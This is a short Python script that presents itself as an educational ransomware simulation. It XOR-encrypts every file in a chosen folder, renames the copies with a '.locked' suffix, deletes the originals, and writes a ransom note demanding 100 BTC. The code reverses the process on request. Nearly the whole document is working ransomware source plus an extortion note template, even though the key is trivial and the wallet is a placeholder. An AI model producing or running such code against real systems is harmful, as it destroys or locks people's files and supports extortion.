import os

# Simple XOR encryption/decryption function
def xor_encrypt_decrypt(data, key=0x42):
    return bytes([b ^ key for b in data])

def process_files(folder, encrypt=True):
    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)
        # Process only files, skip folders
        if os.path.isfile(file_path):
            # Output file name
            if encrypt:
                new_file_path = file_path + ".locked"
            else:
                # Restore original name by removing ".locked"
                if file_path.endswith(".locked"):
                    new_file_path = file_path[:-7]
                else:
                    continue  # Skip files without ".locked"

            # Read and write files in binary mode
            with open(file_path, "rb") as f:
                data = f.read()

            new_data = xor_encrypt_decrypt(data)

            with open(new_file_path, "wb") as f:
                f.write(new_data)

            # Remove the original file
            os.remove(file_path)

def create_ransom_note(folder):
    note = """
 Your files have been encrypted!

To get them back, send 100 BTC to the following wallet:
[FAKE-WALLET-ADDRESS]

Contact: mushfiqbd.cse@example.com

(This is just an educational ransomware simulation)
"""
    with open(os.path.join(folder, "README_RESTORE_FILES.txt"), "w", encoding="utf-8") as f:
        f.write(note)

def main():
    folder = input("Enter the full path of folder to process (e.g., D:\\Test\\Ransomware): ").strip()
    if not os.path.exists(folder):
        print("Folder path does not exist! Exiting.")
        return

    action = input("Type 'encrypt' to lock files or 'decrypt' to unlock files: ").strip().lower()

    if action == "encrypt":
        process_files(folder, encrypt=True)
        create_ransom_note(folder)
        print("Files encrypted and ransom note created.")
    elif action == "decrypt":
        process_files(folder, encrypt=False)
        # Optional: remove ransom note during decryption
        # ransom_path = os.path.join(folder, "README_RESTORE_FILES.txt")
        # if os.path.exists(ransom_path):
        #     os.remove(ransom_path)
        print("Files decrypted (unlocked).")
    else:
        print("Invalid action! Please type 'encrypt' or 'decrypt'.")

if __name__ == "__main__":
    main()
